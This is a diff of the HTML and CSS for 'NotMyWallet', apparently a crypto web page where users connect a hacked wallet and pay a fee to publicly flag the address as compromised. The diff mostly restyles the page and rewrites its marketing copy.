@@ -1,430 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NotMyWallet – Flag Your Hacked Wallet</title>
 
+  <!-- Solana / Web3 -->
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@4.2.0/dist/web3.min.js"></script>
+
+  <!-- Font -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet"
+  />
+
+  <style>
+    :root {
+      --bg: #020617;
+      --card-bg: rgba(15, 23, 42, 0.92);
+      --border: rgba(148, 163, 184, 0.6);
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+      --accent: #22c55e;
+      --accent-soft: rgba(34, 197, 94, 0.15);
+      --accent-2: #a855f7;
+      --danger: #f97316;
+      --danger-soft: rgba(248, 113, 113, 0.18);
+      --shadow-strong: 0 0 40px rgba(34, 197, 94, 0.4);
+      --radius-lg: 18px;
+      --radius-xl: 26px;
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      min-height: 100vh;
+      background:
+        radial-gradient(circle at top, rgba(34, 197, 94, 0.18), transparent 55%),
+        radial-gradient(circle at bottom, rgba(168, 85, 247, 0.2), transparent 55%),
+        var(--bg);
+      color: var(--text);
+      font-family: "Space Grotesk", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
       display: flex;
       flex-direction: column;
-      gap: 6px;
+      overflow-x: hidden;
     }
-
-    .steps-title {
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.14em;
-      color: #9ca3af;
-      margin-bottom: 2px;
-    }
-
-    .steps ol {
-      padding-left: 18px;
-      display: flex;
-      flex-direction: column;
-      gap: 4px;
-    }
-
-    .steps li {
-      line-height: 1.4;
-    }
-
-    .hero-meta {
-      margin-top: 10px;
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-
-    .hero-meta em {
-      color: #e5e7eb;
-      font-style: normal;
-    }
-
-    .illustration-wrapper {
-      margin-top: 10px;
-      max-width: 360px;
-      position: relative;
-    }
-
-    @media (max-width: 880px) {
-      .illustration-wrapper {
-        max-width: 280px;
-      }
-    }
-
-    .pepe {
-      width: 100%;
-      border-radius: var(--radius-xl);
-      border: 1px solid rgba(34, 197, 94, 0.6);
-      box-shadow: 0 20px 40px rgba(15, 23, 42, 0.9);
-      background: radial-gradient(circle at top, rgba(34, 197, 94, 0.25), transparent),
-        #020617;
-      display: block;
-      animation: floatPepe 7s ease-in-out infinite;
-    }
-
-    .pepe-tag {
-      position: absolute;
-      bottom: 12px;
-      right: 12px;
-      padding: 4px 9px;
-      border-radius: 999px;
-      font-size: 0.72rem;
-      text-transform: uppercase;
-      letter-spacing: 0.11em;
-      background: rgba(15, 23, 42, 0.9);
-      border: 1px solid rgba(148, 163, 184, 0.7);
-      color: #e5e7eb;
-    }
-
-    @keyframes floatPepe {
-      0%, 100% { transform: translateY(0) rotate(0deg); }
-      50% { transform: translateY(-6px) rotate(2deg); }
-    }
-
-    /* Right panel */
-
-    .panel {
-      background: var(--card-bg);
-      border-radius: var(--radius-xl);
-      padding: 20px 20px 18px;
-      border: 1px solid var(--border);
-      box-shadow: var(--shadow-strong);
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-      backdrop-filter: blur(18px);
-    }
-
-    .panel-header {
-      display: flex;
-      flex-direction: column;
-      gap: 4px;
-    }
-
-    .panel-title {
-      font-size: 1.1rem;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .panel-title-pill {
-      font-size: 0.7rem;
-      padding: 3px 8px;
-      border-radius: 999px;
-      text-transform: uppercase;
-      letter-spacing: 0.12em;
-      background: var(--accent-soft);
-      color: #bbf7d0;
-      border: 1px solid rgba(34, 197, 94, 0.6);
-    }
-
-    .panel-sub {
-      font-size: 0.86rem;
-      color: var(--muted);
-      line-height: 1.45;
-    }
-
-    .status {
-      font-family: "Space Grotesk", monospace;
-      font-size: 0.85rem;
-      padding: 8px 10px;
-      border-radius: 10px;
-      border: 1px solid rgba(148, 163, 184, 0.7);
-      background: rgba(15, 23, 42, 0.9);
-      color: #e5e7eb;
-      min-height: 32px;
-    }
-
-    .status span {
-      color: #22c55e;
-    }
-
-    .status a {
-      color: var(--accent-2);
-      text-decoration: none;
-    }
-
-    .status a:hover {
-      text-decoration: underline;
-    }
-
-    .btn-row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin-top: 4px;
-    }
-
-    .btn {
-      flex: 1;
-      min-width: 140px;
-      padding: 11px 14px;
-      border-radius: 999px;
-      border: 1px solid rgba(148, 163, 184, 0.8);
-      background: radial-gradient(circle at top left, rgba(34, 197, 94, 0.16), transparent);
-      color: #e5e7eb;
-      font-size: 0.85rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.13em;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      transition: 0.2s ease;
-    }
-
-    .btn:hover {
-      transform: translateY(-1px);
-      box-shadow: 0 10px 28px rgba(15, 23, 42, 0.9);
-      border-color: #e5e7eb;
-    }
-
-    .btn-primary {
-      background: linear-gradient(135deg, #22c55e, #16a34a);
-      border-color: rgba(34, 197, 94, 0.9);
-      color: #020617;
-      box-shadow: 0 0 30px rgba(34, 197, 94, 0.65);
-    }
-
-    .btn-primary:hover {
-      filter: brightness(1.05);
-    }
-
-    .btn-flag {
-      background: var(--danger-soft);
-      border-color: rgba(248, 113, 113, 0.6);
-      color: #fed7aa;
-    }
-
-    .btn-flag.disabled {
-      opacity: 0.4;
-      cursor: default;
-      box-shadow: none;
-      filter: grayscale(0.3);
-    }
-
-    .form {
-      margin-top: 8px;
-      border-radius: var(--radius-lg);
-      border: 1px dashed rgba(148, 163, 184, 0.7);
-      padding: 10px 12px;
-      background: linear-gradient(
-        135deg,
-        rgba(15, 23, 42, 0.95),
-        rgba(15, 23, 42, 0.85)
-      );
-      display: none;
-      flex-direction: column;
-      gap: 8px;
-      font-size: 0.86rem;
-      color: var(--muted);
-    }
-
-    .form-row {
-      display: flex;
-      justify-content: space-between;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-
-    .form-row span {
-      font-family: "Space Grotesk", monospace;
-      font-size: 0.8rem;
-      color: #e5e7eb;
-    }
-
-    textarea {
-      width: 100%;
-      min-height: 70px;
-      resize: vertical;
-      border-radius: 10px;
-      border: 1px solid rgba(148, 163, 184, 0.8);
-      background: rgba(15, 23, 42, 0.95);
-      color: #e5e7eb;
-      padding: 8px 9px;
-      font-family: "Space Grotesk", monospace;
-      font-size: 0.85rem;
-      outline: none;
-    }
-
-    textarea::placeholder {
-      color: rgba(148, 163, 184, 0.8);
-    }
-
-    .fee-line {
-      font-size: 0.78rem;
-      color: var(--muted);
-      line-height: 1.4;
-    }
-
-    .fee-line code {
-      font-family: "Space Grotesk", monospace;
-      font-size: 0.78rem;
-      color: #e5e7eb;
-      background: rgba(15, 23, 42, 0.9);
-      padding: 2px 5px;
-      border-radius: 6px;
-      border: 1px solid rgba(55, 65, 81, 0.9);
-    }
-
-    /* INFO / FAQ SECTION */
-
-    .info {
-      margin-top: 8px;
-      display: flex;
-      flex-direction: column;
-      gap: 18px;
-    }
-
-    .info-header {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-
-    .info-title {
-      font-size: 0.9rem;
-      text-transform: uppercase;
-      letter-spacing: 0.16em;
-      color: var(--muted);
-    }
-
-    .info-sub {
-      font-size: 0.95rem;
-      color: #e5e7eb;
-      max-width: 640px;
-    }
-
-    .info-sub strong {
-      color: #bbf7d0;
-    }
-
-    .info-grid {
-      display: grid;
-      grid-template-columns: minmax(0, 1.4fr) minmax(0, 1.1fr);
-      gap: 18px;
-    }
-
-    @media (max-width: 880px) {
-      .info-grid {
-        grid-template-columns: minmax(0, 1fr);
-      }
-    }
-
-    .info-card {
-      border-radius: var(--radius-lg);
-      border: 1px solid rgba(51, 65, 85, 0.9);
-      background: rgba(15, 23, 42, 0.96);
-      padding: 14px 14px 13px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .info-label {
-      font-size: 0.78rem;
-      text-transform: uppercase;
-      letter-spacing: 0.14em;
-      color: var(--muted);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .info-label span {
-      width: 6px;
-      height: 6px;
-      border-radius: 999px;
-      background: var(--accent);
-      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
-    }
-
-    .info-card h3 {
-      font-size: 0.98rem;
-      font-weight: 600;
-    }
-
-    .info-card p,
-    .info-card li {
-      font-size: 0.84rem;
-      color: var(--muted);
-      line-height: 1.45;
-    }
-
-    .info-card ul {
-      padding-left: 16px;
-      display: flex;
-      flex-direction: column;
-      gap: 4px;
-    }
-
-    .faq-item + .faq-item {
-      border-top: 1px dashed rgba(55, 65, 81, 0.9);
-      padding-top: 8px;
-      margin-top: 6px;
-    }
-
-    .faq-q {
-      font-size: 0.86rem;
-      font-weight: 600;
-      color: #e5e7eb;
-    }
-
-    .faq-a {
-      font-size: 0.84rem;
-      color: var(--muted);
-      margin-top: 2px;
-    }
-
-    .disclaimer {
-      margin-top: 6px;
-      border-radius: var(--radius-lg);
-      border: 1px solid rgba(248, 113, 113, 0.55);
-      background: linear-gradient(
-        135deg,
-        rgba(30, 64, 175, 0.9),
-        rgba(127, 29, 29, 0.92)
-      );
-      padding: 10px 13px;
-      font-size: 0.78rem;
-      color: #fee2e2;
-      line-height: 1.5;
-    }
-
-    .disclaimer-title {
-      font-size: 0.78rem;
-      text-transform: uppercase;
-      letter-spacing: 0.16em;
-      margin-bottom: 4px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .disclaimer-title span {
-      width: 8px;
-      height: 8px;
-      border-radius: 999px;
-      background: #fecaca;
-      box-shadow: 0 0 12px rgba(254, 226, 226, 0.9);
-    }
-
-    .bottom-footer {
-      margin-top: 10px;
-      font-size: 0.78rem;
-      color: var(--muted);
-      text-align: center;
-    }
-
-    .bottom-footer a {
-      color: var(--accent-2);
-      text-decoration: none;
-    }
-
-    .bottom-footer a:hover {
-      text-decoration: underline;
-    }
-
-    /* Background canvas */
 
     #fire {
       position: fixed;
@@ -432,10 +55,625 @@
       z-index: 0;
       pointer-events: none;
     }
+
+    .bg-layer {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+      overflow: hidden;
+    }
+
+    .bg-symbols {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      justify-content: space-around;
+      opacity: 0.25;
+      mix-blend-mode: screen;
+      font-family: "Space Grotesk", monospace;
+      font-size: 0.75rem;
+      color: #facc15;
+    }
+
+    .symbol-column {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      animation: drift 12s linear infinite alternate;
+    }
+    .symbol-column:nth-child(2) { animation-duration: 15s; animation-direction: alternate-reverse; color:#22c55e; }
+    .symbol-column:nth-child(3) { animation-duration: 18s; color:#a855f7; }
+    .symbol { opacity:0.5; }
+
+    @keyframes drift {
+      0% { transform: translateY(10%); }
+      100% { transform: translateY(-25%); }
+    }
+
+    .bg-masks { position:absolute; inset:0; pointer-events:none; }
+    .mask-emoji {
+      position:absolute;
+      font-size:110px;
+      filter:blur(2px);
+      opacity:0.13;
+      mix-blend-mode:screen;
+    }
+    .mask-emoji:nth-child(1){ top:10%; left:-10px; transform:rotate(-10deg); color:#22c55e; }
+    .mask-emoji:nth-child(2){ top:45%; right:-5%; transform:rotate(8deg); color:#a855f7; }
+    .mask-emoji:nth-child(3){ bottom:-5%; left:20%; transform:rotate(3deg); color:#22c55e; }
+
+    .page{
+      position:relative;
+      z-index:1;
+      max-width:1120px;
+      margin:0 auto;
+      padding:24px 16px 40px;
+      display:flex;
+      flex-direction:column;
+      gap:28px;
+    }
+
+    header{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+
+    .logo{
+      width:52px;
+      height:52px;
+      border-radius:999px;
+      /* TODO: remplace l’URL ci-dessous par l’URL publique de ton logo */
+      background:url("https://yourcdn.com/notmywallet-logo.png") center/cover no-repeat;
+      box-shadow:0 0 22px rgba(34,197,94,.7);
+      border:1px solid rgba(34,197,94,.8);
+      flex-shrink:0;
+    }
+
+    .brand-text{ display:flex; flex-direction:column; gap:2px; }
+    .brand-name{
+      font-size:1.3rem;
+      font-weight:700;
+      letter-spacing:.08em;
+      text-transform:uppercase;
+      background:linear-gradient(90deg,#22c55e,#a855f7,#22c55e);
+      -webkit-background-clip:text;
+      background-clip:text;
+      color:transparent;
+    }
+    .brand-tagline{
+      font-size:.8rem;
+      text-transform:uppercase;
+      letter-spacing:.14em;
+      color:var(--muted);
+    }
+
+    .share-btn{
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,.6);
+      padding:10px 18px;
+      background:rgba(15,23,42,.9);
+      color:#e5e7eb;
+      font-size:.85rem;
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      cursor:pointer;
+      transition:.2s ease;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      white-space:nowrap;
+    }
+    .share-btn span{ font-size:1rem; }
+    .share-btn:hover{
+      border-color:#e5e7eb;
+      transform:translateY(-1px);
+      box-shadow:0 10px 30px rgba(15,23,42,.8);
+    }
+
+    @media (max-width:640px){
+      header{ flex-direction:column; align-items:flex-start; }
+    }
+
+    .main{
+      display:grid;
+      grid-template-columns:minmax(0,1.45fr) minmax(0,1.1fr);
+      gap:24px;
+      align-items:center;
+    }
+    @media (max-width:880px){ .main{ grid-template-columns:minmax(0,1fr); } }
+
+    .hero{
+      display:flex;
+      flex-direction:column;
+      gap:16px;
+      position:relative;
+    }
+
+    .hero-pill{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:6px 12px;
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,.6);
+      background:radial-gradient(circle at left,rgba(34,197,94,.2),transparent);
+      font-size:.78rem;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      color:var(--muted);
+      margin-bottom:6px;
+    }
+    .hero-pill span{
+      display:inline-flex;
+      width:6px; height:6px;
+      border-radius:999px;
+      background:#22c55e;
+      box-shadow:0 0 14px rgba(34,197,94,.9);
+    }
+
+    .glitch-title{
+      font-size:clamp(2.4rem,6vw,3.4rem);
+      font-weight:800;
+      letter-spacing:.12em;
+      text-transform:uppercase;
+      position:relative;
+      display:inline-block;
+      line-height:1.1;
+    }
+    .glitch-title span{
+      background:linear-gradient(90deg,#22c55e,#a855f7,#22c55e);
+      -webkit-background-clip:text;
+      background-clip:text;
+      color:transparent;
+    }
+    .glitch-title::before,
+    .glitch-title::after{
+      content:"NotMyWallet";
+      position:absolute;
+      inset:0;
+      mix-blend-mode:screen;
+      opacity:.32;
+      pointer-events:none;
+    }
+    .glitch-title::before{
+      transform:translate(-1px,1px);
+      color:#22c55e;
+      text-shadow:-2px 0 #22c55e;
+      animation:glitchShift 1.9s infinite;
+    }
+    .glitch-title::after{
+      transform:translate(1px,-1px);
+      color:#a855f7;
+      text-shadow:2px 0 #a855f7;
+      animation:glitchShiftAlt 2.1s infinite;
+    }
+    @keyframes glitchShift{
+      0%,100%{transform:translate(-1px,1px);}
+      20%{transform:translate(-2px,-1px);}
+      40%{transform:translate(1px,0);}
+      60%{transform:translate(-1px,2px);}
+      80%{transform:translate(2px,-2px);}
+    }
+    @keyframes glitchShiftAlt{
+      0%,100%{transform:translate(1px,-1px);}
+      20%{transform:translate(2px,1px);}
+      40%{transform:translate(-1px,0);}
+      60%{transform:translate(1px,-2px);}
+      80%{transform:translate(-2px,2px);}
+    }
+
+    .hero-sub{
+      font-size:1.05rem;
+      color:var(--muted);
+      max-width:520px;
+      line-height:1.5;
+    }
+    .hero-sub strong{ color:#e5e7eb; }
+    .hero-sub em{ font-style:normal; color:#bbf7d0; }
+
+    .steps{
+      margin-top:12px;
+      border-radius:var(--radius-lg);
+      border:1px dashed rgba(148,163,184,.6);
+      padding:12px 14px;
+      background:linear-gradient(135deg,rgba(15,23,42,.95),rgba(15,23,42,.75));
+      font-size:.9rem;
+      color:var(--muted);
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+    }
+    .steps-title{
+      font-size:.8rem;
+      text-transform:uppercase;
+      letter-spacing:.14em;
+      color:#9ca3af;
+      margin-bottom:2px;
+    }
+    .steps ol{ padding-left:18px; display:flex; flex-direction:column; gap:4px; }
+    .steps li{ line-height:1.4; }
+
+    .hero-meta{
+      margin-top:10px;
+      font-size:.8rem;
+      color:var(--muted);
+    }
+    .hero-meta em{ color:#e5e7eb; font-style:normal; }
+    .hero-meta strong{ color:#fed7aa; }
+
+    .illustration-wrapper{
+      margin-top:10px;
+      max-width:360px;
+      position:relative;
+    }
+    @media (max-width:880px){ .illustration-wrapper{ max-width:320px; } }
+
+    .pepe{
+      width:100%;
+      border-radius:var(--radius-xl);
+      border:1px solid rgba(34,197,94,.6);
+      box-shadow:0 20px 40px rgba(15,23,42,.9);
+      background:#020617;
+      display:block;
+      animation:floatPepe 7s ease-in-out infinite;
+      object-fit:cover;
+    }
+    .pepe-tag{
+      position:absolute;
+      bottom:12px;
+      right:12px;
+      padding:4px 9px;
+      border-radius:999px;
+      font-size:.72rem;
+      text-transform:uppercase;
+      letter-spacing:.11em;
+      background:rgba(15,23,42,.9);
+      border:1px solid rgba(148,163,184,.7);
+      color:#e5e7eb;
+    }
+    @keyframes floatPepe{
+      0%,100%{transform:translateY(0) rotate(0deg);}
+      50%{transform:translateY(-6px) rotate(2deg);}
+    }
+
+    .panel{
+      background:var(--card-bg);
+      border-radius:var(--radius-xl);
+      padding:20px 20px 18px;
+      border:1px solid var(--border);
+      box-shadow:var(--shadow-strong);
+      display:flex;
+      flex-direction:column;
+      gap:14px;
+      backdrop-filter:blur(18px);
+    }
+
+    .panel-header{ display:flex; flex-direction:column; gap:4px; }
+    .panel-title{
+      font-size:1.1rem;
+      font-weight:600;
+      display:flex;
+      align-items:center;
+      gap:8px;
+    }
+    .panel-title-pill{
+      font-size:.7rem;
+      padding:3px 8px;
+      border-radius:999px;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      background:var(--accent-soft);
+      color:#bbf7d0;
+      border:1px solid rgba(34,197,94,.6);
+    }
+    .panel-sub{
+      font-size:.86rem;
+      color:var(--muted);
+      line-height:1.45;
+    }
+
+    .status{
+      font-family:"Space Grotesk",monospace;
+      font-size:.85rem;
+      padding:8px 10px;
+      border-radius:10px;
+      border:1px solid rgba(148,163,184,.7);
+      background:rgba(15,23,42,.9);
+      color:#e5e7eb;
+      min-height:32px;
+    }
+    .status span{ color:#22c55e; }
+    .status a{ color:var(--accent-2); text-decoration:none; }
+    .status a:hover{ text-decoration:underline; }
+
+    .btn-row{
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      margin-top:4px;
+    }
+    .btn{
+      flex:1;
+      min-width:140px;
+      padding:11px 14px;
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,.8);
+      background:radial-gradient(circle at top left,rgba(34,197,94,.16),transparent);
+      color:#e5e7eb;
+      font-size:.85rem;
+      font-weight:600;
+      text-transform:uppercase;
+      letter-spacing:.13em;
+      cursor:pointer;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+      transition:.2s ease;
+    }
+    .btn:hover{
+      transform:translateY(-1px);
+      box-shadow:0 10px 28px rgba(15,23,42,.9);
+      border-color:#e5e7eb;
+    }
+    .btn-primary{
+      background:linear-gradient(135deg,#22c55e,#16a34a);
+      border-color:rgba(34,197,94,.9);
+      color:#020617;
+      box-shadow:0 0 30px rgba(34,197,94,.65);
+    }
+    .btn-primary:hover{ filter:brightness(1.05); }
+    .btn-flag{
+      background:var(--danger-soft);
+      border-color:rgba(248,113,113,.6);
+      color:#fed7aa;
+    }
+    .btn-flag.disabled{
+      opacity:.4;
+      cursor:default;
+      box-shadow:none;
+      filter:grayscale(.3);
+    }
+
+    .form{
+      margin-top:8px;
+      border-radius:var(--radius-lg);
+      border:1px dashed rgba(148,163,184,.7);
+      padding:10px 12px;
+      background:linear-gradient(135deg,rgba(15,23,42,.95),rgba(15,23,42,.85));
+      display:none;
+      flex-direction:column;
+      gap:8px;
+      font-size:.86rem;
+      color:var(--muted);
+    }
+    .form-row{
+      display:flex;
+      justify-content:space-between;
+      gap:8px;
+      flex-wrap:wrap;
+    }
+    .form-row span{
+      font-family:"Space Grotesk",monospace;
+      font-size:.8rem;
+      color:#e5e7eb;
+    }
+    textarea{
+      width:100%;
+      min-height:70px;
+      resize:vertical;
+      border-radius:10px;
+      border:1px solid rgba(148,163,184,.8);
+      background:rgba(15,23,42,.95);
+      color:#e5e7eb;
+      padding:8px 9px;
+      font-family:"Space Grotesk",monospace;
+      font-size:.85rem;
+      outline:none;
+    }
+    textarea::placeholder{ color:rgba(148,163,184,.8); }
+    .fee-line{
+      font-size:.78rem;
+      color:var(--muted);
+      line-height:1.4;
+    }
+    .fee-line code{
+      font-family:"Space Grotesk",monospace;
+      font-size:.78rem;
+      color:#e5e7eb;
+      background:rgba(15,23,42,.9);
+      padding:2px 5px;
+      border-radius:6px;
+      border:1px solid rgba(55,65,81,.9);
+    }
+
+    .info{
+      margin-top:8px;
+      display:flex;
+      flex-direction:column;
+      gap:18px;
+    }
+    .info-header{ display:flex; flex-direction:column; gap:6px; }
+    .info-title{
+      font-size:.9rem;
+      text-transform:uppercase;
+      letter-spacing:.16em;
+      color:var(--muted);
+    }
+    .info-sub{
+      font-size:.95rem;
+      color:#e5e7eb;
+      max-width:640px;
+    }
+    .info-sub strong{ color:#bbf7d0; }
+
+    .info-grid{
+      display:grid;
+      grid-template-columns:minmax(0,1.4fr) minmax(0,1.1fr);
+      gap:18px;
+    }
+    @media (max-width:880px){ .info-grid{ grid-template-columns:minmax(0,1fr); } }
+
+    .info-card{
+      border-radius:var(--radius-lg);
+      border:1px solid rgba(51,65,85,.9);
+      background:rgba(15,23,42,.96);
+      padding:14px 14px 13px;
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+    }
+    .info-label{
+      font-size:.78rem;
+      text-transform:uppercase;
+      letter-spacing:.14em;
+      color:var(--muted);
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+    }
+    .info-label span{
+      width:6px; height:6px;
+      border-radius:999px;
+      background:var(--accent);
+      box-shadow:0 0 10px rgba(34,197,94,.9);
+    }
+    .info-card h3{ font-size:.98rem; font-weight:600; }
+    .info-card p,
+    .info-card li{
+      font-size:.84rem;
+      color:var(--muted);
+      line-height:1.45;
+    }
+    .info-card ul{
+      padding-left:16px;
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .faq-item + .faq-item{
+      border-top:1px dashed rgba(55,65,81,.9);
+      padding-top:8px;
+      margin-top:6px;
+    }
+    .faq-q{ font-size:.86rem; font-weight:600; color:#e5e7eb; }
+    .faq-a{ font-size:.84rem; color:var(--muted); margin-top:2px; }
+
+    .disclaimer{
+      margin-top:6px;
+      border-radius:var(--radius-lg);
+      border:1px solid rgba(248,113,113,.55);
+      background:linear-gradient(135deg,rgba(30,64,175,.9),rgba(127,29,29,.92));
+      padding:10px 13px;
+      font-size:.78rem;
+      color:#fee2e2;
+      line-height:1.5;
+    }
+    .disclaimer-title{
+      font-size:.78rem;
+      text-transform:uppercase;
+      letter-spacing:.16em;
+      margin-bottom:4px;
+      display:flex;
+      align-items:center;
+      gap:6px;
+    }
+    .disclaimer-title span{
+      width:8px; height:8px;
+      border-radius:999px;
+      background:#fecaca;
+      box-shadow:0 0 12px rgba(254,226,226,.9);
+    }
+
+    .bottom-footer{
+      margin-top:10px;
+      font-size:.78rem;
+      color:var(--muted);
+      text-align:center;
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+      align-items:center;
+    }
+    .bottom-footer-main a{
+      color:var(--accent-2);
+      text-decoration:none;
+    }
+    .bottom-footer-main a:hover{ text-decoration:underline; }
+
+    .social-links{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-size:.86rem;
+    }
+    .social-links a{
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:6px 10px;
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,.7);
+      background:rgba(15,23,42,.95);
+      color:#e5e7eb;
+      text-decoration:none;
+      font-size:.78rem;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+    }
+    .social-links a span{ font-size:1rem; }
+    .social-links a:hover{
+      border-color:#e5e7eb;
+      box-shadow:0 8px 22px rgba(15,23,42,.9);
+      transform:translateY(-1px);
+    }
   </style>
 </head>
 <body>
   <canvas id="fire"></canvas>
+
+  <div class="bg-layer">
+    <div class="bg-symbols">
+      <div class="symbol-column">
+        <div class="symbol">0xPH1SH</div>
+        <div class="symbol">Ξ / REKT</div>
+        <div class="symbol">SCAM ▒▒▒</div>
+        <div class="symbol">0xDEAD</div>
+        <div class="symbol">☠ wallet</div>
+        <div class="symbol">DRAINED</div>
+      </div>
+      <div class="symbol-column">
+        <div class="symbol">⚠ compromised</div>
+        <div class="symbol">₿ dust</div>
+        <div class="symbol">SCAM AIRDROP</div>
+        <div class="symbol">CEX LEAK</div>
+        <div class="symbol">SIM-SWAP</div>
+        <div class="symbol">🔥 blacklist</div>
+      </div>
+      <div class="symbol-column">
+        <div class="symbol">0xNOTMY</div>
+        <div class="symbol">Ξ wallet</div>
+        <div class="symbol">MALWARE</div>
+        <div class="symbol">FAKE BOT</div>
+        <div class="symbol">PHISH LINK</div>
+        <div class="symbol">SCAMMER FARM</div>
+      </div>
+    </div>
+    <div class="bg-masks">
+      <div class="mask-emoji">🎭</div>
+      <div class="mask-emoji">🎭</div>
+      <div class="mask-emoji">🎭</div>
+    </div>
+  </div>
 
   <div class="page">
     <header>
@@ -452,7 +690,6 @@
     </header>
 
     <main class="main">
-      <!-- LEFT: copy + illustration -->
       <section class="hero">
         <div class="hero-pill">
           <span></span> Compromised wallets registry
@@ -460,8 +697,8 @@
         <h1 class="glitch-title"><span>NotMyWallet</span></h1>
         <p class="hero-sub">
           <strong>My wallet was hacked. It’s not mine anymore.</strong><br />
-          Flag it on-chain so nobody sends funds there ever again. A simple public
-          “this address is dead” signal – verified by the real owner.
+          This address is <em>dead</em>. Flag it on-chain so nobody in their right mind sends funds
+          there ever again – especially after <em>phishing, fake bots, dusting or scam airdrops</em>.
         </p>
 
         <div class="steps">
@@ -469,19 +706,20 @@
           <ol>
             <li>Empty your hacked wallet (move funds to a new, safe address).</li>
             <li>Connect the <em>compromised</em> address with Phantom or MetaMask.</li>
-            <li>Pay a small fee to flag it on-chain as <em>compromised</em>.</li>
+            <li>Pay a small fee to flag it on-chain as <em>compromised forever</em>.</li>
           </ol>
         </div>
 
         <p class="hero-meta">
           No seed phrase. No private key sharing. Just an on-chain
-          <em>“Not my wallet anymore”</em>
-          statement that anyone can verify.
+          <em>“Not my wallet anymore”</em> statement that anyone can verify –
+          <strong>for scammers it’s a red flag, for users it’s a loud warning.</strong>
         </p>
 
         <div class="illustration-wrapper">
+          <!-- TODO: remplace l’URL ci-dessous par l’URL publique de ton visuel pepe -->
           <img
-            src="https://i.imgur.com/3vZfK5L.png"
+            src="https://yourcdn.com/notmywallet-hero-pepe.jpg"
             alt="Cyber degen burning a hacked wallet"
             class="pepe"
           />
@@ -489,16 +727,16 @@
         </div>
       </section>
 
-      <!-- RIGHT: action panel -->
       <section class="panel">
         <div class="panel-header">
           <div class="panel-title">
             Burn your hacked wallet
-            <span class="panel-title-pill">On-chain flag</span>
+            <span class="panel-title-pill">On-chain fee</span>
           </div>
           <p class="panel-sub">
-            Connect the compromised address and mark it as compromised. This creates a verifiable,
-            on-chain “do not use” signal forever for explorers, protocols and humans.
+            Connect the compromised address and pay the burn-fee. This transaction is a public,
+            on-chain “this wallet is compromised” signal. Registry integrations can read it and
+            treat that address as toxic forever.
           </p>
         </div>
 
@@ -527,11 +765,11 @@
           </div>
           <div>
             <label for="reason" style="font-size: 0.8rem; color: var(--muted);"
-              >Reason (public, optional)</label
+              >Reason (public, optional text – not on-chain yet)</label
             >
             <textarea
               id="reason"
-              placeholder="hacked, drained, phishing, CEX leak, SIM swap, etc."
+              placeholder="hacked, drained after phishing, fake bot, CEX leak, dusting, etc."
             ></textarea>
           </div>
           <p class="fee-line">
@@ -542,38 +780,37 @@
       </section>
     </main>
 
-    <!-- INFO / FAQ / DISCLAIMER -->
     <section class="info">
       <div class="info-header">
         <div class="info-title">More details</div>
         <p class="info-sub">
-          NotMyWallet is a small but critical piece of the security stack: a
-          <strong>public graveyard for rekt wallets</strong>. It doesn’t un-wreck you –
-          it stops the same address from farming fresh victims.
+          NotMyWallet is the place where <strong>rekt wallets go to die</strong>. It won’t refund
+          you, but it makes sure everyone sees that this address is
+          <strong>phishing / scam / compromised</strong> before interacting with it again.
         </p>
       </div>
 
       <div class="info-grid">
-        <!-- How NotMyWallet works -->
         <article class="info-card">
-          <div class="info-label"><span></span> What actually happens on-chain?</div>
-          <h3>How NotMyWallet works under the hood</h3>
+          <div class="info-label"><span></span> What happens on-chain today?</div>
+          <h3>Simple, verifiable fee transaction</h3>
           <ul>
-            <li>You connect the compromised address directly (no custody, no off-chain login).</li>
-            <li>You call a <strong>flag function</strong> on-chain with an optional public reason.</li>
